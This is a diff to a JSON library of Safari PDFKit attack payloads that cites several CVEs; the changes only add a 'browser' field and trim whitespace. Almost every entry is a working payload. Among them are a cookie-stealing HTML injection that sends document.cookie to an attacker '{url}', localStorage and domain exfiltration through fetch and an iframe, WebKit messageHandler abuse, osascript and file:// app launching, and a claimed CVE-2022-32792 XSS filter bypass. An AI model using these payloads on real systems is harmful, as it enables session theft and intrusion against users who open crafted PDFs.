@@ -12,7 +12,7 @@
     ],
     "cve_references": [
       "CVE-2019-8506",
-      "CVE-2020-3852", 
+      "CVE-2020-3852",
       "CVE-2021-1844",
       "CVE-2022-32792"
     ]
@@ -24,7 +24,8 @@
       "technique": "basic_domain_alert",
       "payload": "alert(document.domain)",
       "description": "Basic Safari PDFKit domain disclosure via alert",
-      "risk_level": "low"
+      "risk_level": "low",
+      "browser": "safari"
     },
     {
       "id": "safari_002",
@@ -32,7 +33,8 @@
       "technique": "dom_cookie_theft",
       "payload": "document.body.innerHTML='<img src=x onerror=fetch(\"{url}/dom?cookie=\"+document.cookie)>'",
       "description": "Safari PDFKit DOM manipulation for cookie theft via HTML injection",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "safari"
     },
     {
       "id": "safari_003",
@@ -40,15 +42,17 @@
       "technique": "webkit_messagehandlers",
       "payload": "try { webkit.messageHandlers.exploit.postMessage('{url}'); } catch(e) { }",
       "description": "Safari PDFKit WebKit messageHandlers exploitation",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "safari"
     },
     {
-      "id": "safari_004", 
+      "id": "safari_004",
       "category": "webkit_specific",
       "technique": "webkit_preview_handler",
       "payload": "try { window.webkit.messageHandlers.preview.postMessage({action: 'navigate', url: '{url}'}); } catch(e) { }",
       "description": "Safari PDFKit WebKit preview handler abuse for navigation",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "safari"
     },
     {
       "id": "safari_005",
@@ -56,7 +60,8 @@
       "technique": "applescript_execution",
       "payload": "app.launchURL('osascript://tell%20application%20\"Safari\"%20to%20open%20location%20\"{url}\"', true);",
       "description": "Safari PDFKit AppleScript execution for Safari navigation",
-      "risk_level": "critical"
+      "risk_level": "critical",
+      "browser": "safari"
     },
     {
       "id": "safari_006",
@@ -64,15 +69,17 @@
       "technique": "system_preferences_access",
       "payload": "app.launchURL('x-apple.systempreferences:com.apple.preference.security?url={url}', true);",
       "description": "Safari PDFKit system preferences access with parameter injection",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "safari"
     },
     {
       "id": "safari_007",
       "category": "file_system",
-      "technique": "applications_directory_access", 
+      "technique": "applications_directory_access",
       "payload": "app.launchURL('file:///Applications/Calculator.app', true);",
       "description": "Safari PDFKit file system access to Applications directory",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "safari"
     },
     {
       "id": "safari_008",
@@ -80,7 +87,8 @@
       "technique": "system_library_access",
       "payload": "app.launchURL('file:///System/Library/CoreServices/Finder.app', true);",
       "description": "Safari PDFKit access to system library applications",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "safari"
     },
     {
       "id": "safari_009",
@@ -88,7 +96,8 @@
       "technique": "localstorage_manipulation",
       "payload": "localStorage.setItem('pwned','true');fetch('{url}/storage?data='+localStorage.getItem('pwned'))",
       "description": "Safari PDFKit localStorage manipulation and data exfiltration",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "safari"
     },
     {
       "id": "safari_010",
@@ -96,7 +105,8 @@
       "technique": "iframe_injection",
       "payload": "document.body.innerHTML='<iframe src=\"javascript:fetch(\\'{url}/iframe?domain=\\'+parent.document.domain)\"></iframe>'",
       "description": "Safari PDFKit iframe injection for parent context access",
-      "risk_level": "high"
+      "risk_level": "high",
+      "browser": "safari"
     },
     {
       "id": "safari_011",
@@ -104,7 +114,8 @@
       "technique": "clipboard_manipulation",
       "payload": "navigator.clipboard.writeText('Clipboard text compromised').then(function(){fetch('{url}/clipboard?status=compromised')}).catch(function(err){fetch('{url}/clipboard?error='+encodeURIComponent(err))});",
       "description": "Safari PDFKit clipboard access and manipulation",
-      "risk_level": "medium"
+      "risk_level": "medium",
+      "browser": "safari"
     },
     {
       "id": "safari_012",
@@ -112,7 +123,8 @@
       "technique": "cve_2022_32792_exploit",
       "payload": "location='javascript:/*</script><svg/onload=fetch(\"{url}/cve?domain=\"+document.domain)>//';//'",
       "description": "Safari PDFKit CVE-2022-32792 XSS protection bypass exploit",
-      "risk_level": "critical"
+      "risk_level": "critical",
+      "browser": "safari"
     }
   ]
 }
